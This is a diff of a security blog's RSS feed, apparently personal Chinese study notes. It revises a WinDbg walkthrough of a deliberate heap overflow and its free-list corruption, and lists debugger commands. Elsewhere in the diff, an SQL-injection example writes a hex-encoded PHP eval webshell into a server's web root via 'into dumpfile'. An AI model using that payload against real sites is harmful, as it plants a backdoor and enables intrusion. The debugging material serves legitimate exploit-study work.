@@ -5,8 +5,8 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Fri, 19 Aug 2016 20:46:58 +0800</pubDate>
-    <lastBuildDate>Fri, 19 Aug 2016 20:46:58 +0800</lastBuildDate>
+    <pubDate>Sat, 20 Aug 2016 13:59:08 +0800</pubDate>
+    <lastBuildDate>Sat, 20 Aug 2016 13:59:08 +0800</lastBuildDate>
     <generator>Jekyll v3.1.6</generator>
     
       <item>
@@ -610,7 +610,7 @@ f8
 
 &lt;h4 id=&quot;section&quot;&gt;2&amp;gt;漏洞战争实例&lt;/h4&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;系统:winxp sp3+vc6.0
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;系统:win7 x64+vc6.0
 
 ------------------heapoverflow.c---------------------
 #include &amp;lt;windows.h&amp;gt;
@@ -685,9 +685,9 @@ g
 在exe中随意输入字符并回车
 windbg中断在断点处:
     Breakpoint 0 hit
-    eax=00000031 ebx=7ffd3000 ecx=00409e41 edx=00000101 esi=00407065 edi=0012ff81
-    eip=0040104b esp=0012ff4c ebp=003a0000 iopl=0         nv up ei pl nz na pe nc
-    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+    eax=00000031 ebx=7efde000 ecx=00409e41 edx=00000101 esi=00407065 edi=0018ff49
+    eip=0040104b esp=0018ff14 ebp=00870000 iopl=0         nv up ei pl nz na pe nc
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
     heapoverflow+0x104b:
     0040104b 83c404          add     esp,4
 t
@@ -698,29 +698,186 @@ t
 !heap -h
     0:000&amp;gt; !heap -h
     Index   Address  Name      Debugging options enabled
-    1:   00140000 
-         Segment at 00140000 to 00240000 (00004000 bytes committed)
-    2:   00240000 
-         Segment at 00240000 to 00250000 (00006000 bytes committed)
-    3:   00250000 
-         Segment at 00250000 to 00260000 (00003000 bytes committed)
-    4:   00380000 
-         Segment at 00380000 to 00390000 (00002000 bytes committed)
-    5:   003a0000  ====&amp;gt;代码中创建的堆
-         Segment at 003a0000 to 003b0000 (00001000 bytes committed)       
-dt _HEAP 0x3a0000
-    +0x178 FreeLists        : [128] _LIST_ENTRY [ 0x3a0688 - 0x3a0688 ]
-dd 0x3a0688
-    0:000&amp;gt; dd 0x3a0688
-    003a0688  003a0178 003a0178 00000000 00000000
-    003a0698  00000000 00000000 00000000 00000000
+      1:   00590000 
+        Segment at 00590000 to 00690000 (00007000 bytes committed)
+      2:   00240000 
+        Segment at 00240000 to 00250000 (00002000 bytes committed)
+      3:   00870000 
+        Segment at 00870000 to 00880000 (00001000 bytes committed)
+
+dt _HEAP 870000
+    +0x0c4 FreeLists        : _LIST_ENTRY [ 0x870590 - 0x870590 ] ==&amp;gt;说明0x870590处是free[0]空表的第一个堆块
+    此时free[0]空表偏移不再是0x178处,而是0x0c4处
+dt _LIST_ENTRY 8700c4
+    0:000&amp;gt; dt _LIST_ENTRY 870590
+    ntdll!_LIST_ENTRY
+     [ 0x8700c4 - 0x8700c4 ]
+       +0x000 Flink            : 0x008700c4 _LIST_ENTRY [ 0x870590 - 0x870590 ]
+       +0x004 Blink            : 0x008700c4 _LIST_ENTRY [ 0x870590 - 0x870590 ]
+
 t
+    此时进入了HeapAlloc函数内部
+shift+f11
+    执行到跳出HeapAlloc函数(系统领域)到当上一层函数
 (eip=401059)
-    
-    
+    此时堆分配完成
+    dt _heap 870000
+        +0x0c4 FreeLists        : _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
+    这个结果表明free[0]空表的第一个堆快不再是原来的0x870590,而变成了0x8705a8
+    dt _LIST_ENTRY 8705a8
+        0:000&amp;gt; dt _LIST_ENTRY 8705a8
+        ntdll!_LIST_ENTRY
+         [ 0x8700c4 - 0x8700c4 ]
+           +0x000 Flink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
+           +0x004 Blink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
+    查看寄存器也可以看到eax=870590(原来的free[0]空表中的第一个堆块的索引值),也即源代码中的heap=HeapAlloc(hHeap,0,0x10)
+    分配到的堆的索引为870590,那么heap_entry结构在870590-8=870588处
+    dt _HEAP_ENTRY 870590
+        0:000&amp;gt; dt _heap_entry 870590
+        ntdll!_HEAP_ENTRY
+           +0x000 Size             : 0xc4
+           +0x002 Flags            : 0x87 &#39;&#39;
+           +0x003 SmallTagIndex    : 0 &#39;&#39;
+           +0x000 SubSegmentCode   : 0x008700c4 
+           +0x004 PreviousSize     : 0xc4
+           +0x006 SegmentOffset    : 0x87 &#39;&#39;
+           +0x006 LFHFlags         : 0x87 &#39;&#39;
+           +0x007 UnusedBytes      : 0 &#39;&#39;
+           +0x000 FunctionIndex    : 0xc4
+           +0x002 ContextValue     : 0x87
+           +0x000 InterceptorValue : 0x8700c4
+           +0x004 UnusedBytesLength : 0xc4
+           +0x006 EntryOffset      : 0x87 &#39;&#39;
+           +0x007 ExtendedBlockSignature : 0 &#39;&#39;
+           +0x000 Code1            : 0x8700c4
+           +0x004 Code2            : 0xc4
+           +0x006 Code3            : 0x87 &#39;&#39;
+           +0x007 Code4            : 0 &#39;&#39;
+           +0x000 AgregateCode     : 0x8700c4`008700c4
+    发现前两个字节并不是3(HeapAlloc分配0x10+8=3*8共3个堆单元大小的空间),对照泉哥书中的命令,发现查看命令应该是
+    !heap -p -a 870588,而不是我认为的dt _heap_entry 870590,后来在这篇文章中找到同样的问题,说是&quot;nt6以后,heap结构
+    变得不小,dt heap_entry是无法看到的,貌似heap_entry做了编码&quot;
+        http://www.cppblog.com/ay19880703/archive/2011/10/30/159364.html
+    于是用书中的!heap -p -a 870588查看heap_entry结构
+    !heap -p -a 870588
+        0:000&amp;gt; !heap -p -a 870588
+            address 00870588 found in
+            _HEAP @ 870000
+              HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
+                00870588 0003 0000  [00]   00870590    00010 - (busy)
+    能够正常查看heap_entry的信息,当前堆块大小为3,上一堆块大小为0
+    !heap
+        0:000&amp;gt; !heap
+        Index   Address  Name      Debugging options enabled
+          1:   00590000                
+          2:   00240000                
+          3:   00870000 
+    !heap -a 870000
+        Heap entries for Segment00 in Heap 00870000
+            00870000: 00000 . 00588 [101] - busy (587)
+            00870588: 00588 . 00018 [101] - busy (10)
+            008705a0: 00018 . 00a40 [100]
+            00870fe0: 00a40 . 00020 [111] - busy (1d)
+            00871000:      0000f000      - uncommitted bytes.
+    从这里看出heap堆的地址为870588,而不是870590,这与0day2中堆块的索引为heap_entry(占用态)或者heap_free_entry
+    (空闲堆块)的地址有点不同,这里的!heap -a 870000得到的&quot;entries&quot;如果理解成&quot;索引&quot;会指向heap_entry-8或者是
+    heap_free_entry-8的堆块块首处,这里的entries按&quot;入口&quot;来理解比较好,从上面也可看出870588下一个堆块是个空闲堆块,
+    而且这个空闲堆块的入口是8705a0(与上面的HeapAlloc分配后free[0]空表的第一个堆块的索引为8705a8正好对应)
+    与上面的dt _heap_entry一样的是dt _heap_free_entry也不能得到想要的数据下,如下:
+    dt _heap_free_entry 8705a0
+        0:000&amp;gt; dt _heap_free_entry 8705a0
+        ntdll!_HEAP_FREE_ENTRY
+           +0x000 Size             : 0x38a0
+           +0x002 Flags            : 0x39 &#39;9&#39;
+           +0x003 SmallTagIndex    : 0x1e &#39;&#39;
+           +0x000 SubSegmentCode   : 0x1e3938a0 
+           +0x004 PreviousSize     : 0x81cd    =====&amp;gt;这里应该是3
+           +0x006 SegmentOffset    : 0 &#39;&#39;
+           +0x006 LFHFlags         : 0 &#39;&#39;
+           +0x007 UnusedBytes      : 0 &#39;&#39;
+           +0x000 FunctionIndex    : 0x38a0
+           +0x002 ContextValue     : 0x1e39
+           +0x000 InterceptorValue : 0x1e3938a0
+           +0x004 UnusedBytesLength : 0x81cd
+           +0x006 EntryOffset      : 0 &#39;&#39;
+           +0x007 ExtendedBlockSignature : 0 &#39;&#39;
+           +0x000 Code1            : 0x1e3938a0
+           +0x004 Code2            : 0x81cd
+           +0x006 Code3            : 0 &#39;&#39;
+           +0x007 Code4            : 0 &#39;&#39;
+           +0x000 AgregateCode     : 0x81cd`1e3938a0
+           +0x008 FreeList         : _LIST_ENTRY [ 0x8700c4 - 0x8700c4 ]
+    在+04的偏移处的值是上一个堆块的大小,上一个堆块的大小应该是3,这里确不是,说明dt _heap_free_entry和dt
+    _heap_entry在win7 x64位上都已经不再有用了,dt _list_entry 8705a0+8还是可以用的,也即_list_entry没有变,如下:
+    dt _list_entry 8705a0+8
+        0:000&amp;gt; dt _list_entry 8705a0+8
+        ntdll!_LIST_ENTRY
+         [ 0x8700c4 - 0x8700c4 ]
+           +0x000 Flink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
+           +0x004 Blink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]       
+    _list_entry可以正常显示
 
-
-
+p
+p
+p
+...
+(eip=401084)
+    此处对应的是如下的strcpy的复制过程
+    00401084 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+    此时查看esi和esi中的内容如下:
+    dd edi
+        0:000&amp;gt; dd edi
+        00870590  008700c4 008700c4 00000000 00000000
+        008705a0  1e3938a0 000081cd 008700c4 008700c4
+        008705b0  00000000 00000000 00000000 00000000
+        008705c0  00000000 00000000 00000000 00000000
+        008705d0  00000000 00000000 00000000 00000000
+        008705e0  00000000 00000000 00000000 00000000
+        008705f0  00000000 00000000 00000000 00000000
+        00870600  00000000 00000000 00000000 00000000
+    dd esi
+        0:000&amp;gt; dd esi
+        0018ff28  41414141 41414141 41414141 41414141
+        0018ff38  41414141 41414141 41414141 41414141
+        0018ff48  00407000 00401327 00000001 00240f48
+        0018ff58  00240f90 00000000 00000000 7efde000
+        0018ff68  00000000 00000000 0018ff5c 00000000
+        0018ff78  0018ffc4 00402c50 004060b8 00000000
+        0018ff88  0018ff94 7563338a 7efde000 0018ffd4
+        0018ff98  772f9a02 7efde000 204f7149 00000000
+p
+(eip=401086)
+    此时复制完成,此时的空闲堆块8705a0(索引为8705a8,堆入口为8705a0)
+    看看空闲堆块变成什么了
+    dt _heap_free_entry 8705a0
+        0:000&amp;gt; dt _heap_free_entry 8705a0
+        ntdll!_HEAP_FREE_ENTRY
+           +0x000 Size             : 0x4141
+           +0x002 Flags            : 0x41 &#39;A&#39;
+           +0x003 SmallTagIndex    : 0x41 &#39;A&#39;
+           +0x000 SubSegmentCode   : 0x41414141 
+           +0x004 PreviousSize     : 0x4141
+           +0x006 SegmentOffset    : 0x41 &#39;A&#39;
+           +0x006 LFHFlags         : 0x41 &#39;A&#39;
+           +0x007 UnusedBytes      : 0x41 &#39;A&#39;
+           +0x000 FunctionIndex    : 0x4141
+           +0x002 ContextValue     : 0x4141
+           +0x000 InterceptorValue : 0x41414141
+           +0x004 UnusedBytesLength : 0x4141
+           +0x006 EntryOffset      : 0x41 &#39;A&#39;
+           +0x007 ExtendedBlockSignature : 0x41 &#39;A&#39;
+           +0x000 Code1            : 0x41414141
+           +0x004 Code2            : 0x4141
+           +0x006 Code3            : 0x41 &#39;A&#39;
+           +0x007 Code4            : 0x41 &#39;A&#39;
+           +0x000 AgregateCode     : 0x41414141`41414141
+           +0x008 FreeList         : _LIST_ENTRY [ 0x41414141 - 0x41414141 ]
+    8705a0堆块头以及后面的FreeList中的前后向指针都被上面的esi中的414141...41覆盖了,可想后面再执行HeapFree释放已
+    分配的heap堆块时,会将heap堆块与后面的空闲堆块8705a0进行合并,修改两个合并堆块的前后向指针,此时就会引用到
+    0x41414141,最后造成崩溃.如果将上面释放堆块的操作换成分配堆块HeapAlloc(hHeap,0,0x10)也会导致崩溃,因为在分配
+    堆块时会去遍历空闲链表指针,造成地址引用异常.这里由于只是分配了一个堆块(代码中为HeapAlloc(hHeap,0,0x10)),这
+    一个唯一分配的堆块后面的堆块是剩下的空闲堆块，如果分配多个堆块,先被覆盖的就是多个堆块中的下一个堆块了，一般
+    不会覆盖到空闲堆块，如果空闲堆块被覆盖，说明所有的已分配堆块都被覆盖了,因为空闲堆块在所有已分配堆块的最后
 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
@@ -1226,8 +1383,9 @@ good article:
         kp:显示传递给堆栈回溯中的每个函数的所有参数
     ub mso!Ordinal1273+0x2581:反汇编mso!Ordinal1273+0x2581地址之前的代码
         uf test!main:反汇编test!main函数
-    p:单步步入step into(f11)
-    t:单步步过step over(f10)
+    p:单步步入step over
+    t:单步步过trace into
+    gu:执行到上一层函数,也即把当前函数帧执行到retn,并执行这个retn
     ? ebp-edi:显示表达式ebp-edi的值
         ?? expression:显示c++表达式的值
     .cls:清屏
@@ -1244,12 +1402,12 @@ good article:
     bc 清除所有断点
         bc * 清除所有断点
     bu 对某个符号下断点,eg. bu MyApp!SomeFunction
-        在代码被修改之后，该断点会随着函数地址改变而自动更新到最新位置，而且bu断点会保存在WinDbg工作空间中，下
+        在代码被修改之后,该断点会随着函数地址改变而自动更新到最新位置,而且bu断点会保存在WinDbg工作空间中,下
         次启动WinDbg时该断点会自动设置
     bd 禁用断点
     be 启用被bd命令禁用的断点
     ba e|r|w(执行|读|写) 1|2|4|8(单位字节) addr
-        eg.对内存0x11111111进行写操作的时候下断点命令为：ba w4 0x11111111
+        eg.对内存0x11111111进行写操作的时候下断点命令为:ba w4 0x11111111
     其中windbg中的kb命令相当于od中的查看调用堆栈(alt+k),如下图中的ChildEBP列为当前eip对应的ebp的值,RetAddr为当
     前eip所在的函数的函数返回地址,Args to Child为当前函数的参数
     要注意的是,并不是kb下面的所有的ChildEBP对应的一列都是函数调用,只有第一排的ChildEBP,RetAddr,Args to
@@ -2272,7 +2430,7 @@ noremap wo :tabopen http://192.168.3.13:1235/webinfos &amp;lt;CR&amp;gt;
    udf:http://www.cnblogs.com/qing123/p/4676808.html
    outfile和dumpfile区别:http://www.dedecms.com/knowledge/data-base/mysql/2012/0819/7569.html
    在phpmyadmin中
-   windows系统在phpmyadmin的web后台写文件时写成into dumpfile &#39;c:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;ww&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ome&lt;span class=&quot;se&quot;&gt;\1&lt;/span&gt;.php&#39;无法写入时，改成into dumpfie &#39;c:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;www&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;some&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;1.php&#39;
+   windows系统在phpmyadmin的web后台写文件时写成into dumpfile &#39;c:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;ww&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ome&lt;span class=&quot;se&quot;&gt;\1&lt;/span&gt;.php&#39;无法写入时,改成into dumpfie &#39;c:&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;www&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;some&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;1.php&#39;
    SELECT HEX(LOAD_FILE(0x2f70687073747564792f7777772f72654475682e706870))INTO DUMPFILE　&#39;/phpstudy/www/121.txt&#39;    (/phpstudy/www/reDuh.php)  本地(linux)取hex值
    select unhex(&#39;...&#39;) into dumpfile &#39;c:/inetpub/wwwroot/memberinfo/....php&#39;;-- -成功,这样不会被转义,如果是outfile会被转义　远程dumpfile出去 (对方windows)
    同理写shell:bs/news.php?id=3 and 1=2 union select null,null,null,null,unhex(&#39;3C3F70687020406576616C28245F504F53545B27746F6D275D293B3F3E&#39;) into dumpfile &#39;C:/AAWServer/www/php/k82.php&#39;;
@@ -2603,6 +2761,9 @@ noremap wo :tabopen http://192.168.3.13:1235/webinfos &amp;lt;CR&amp;gt;
 &lt;span class=&quot;p&quot;&gt;170.&lt;/span&gt;discuz漏洞扫描工具
     dzscan
     https://github.com/code-scan/dzscan
+&lt;span class=&quot;p&quot;&gt;171.&lt;/span&gt;windbg中找不到symbol路径解决方法:
+    .sympath srv&lt;span class=&quot;ge&quot;&gt;*c:symbols*&lt;/span&gt;http://msdl.microsoft.com/download/symbols
+    .reload /f
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 </description>
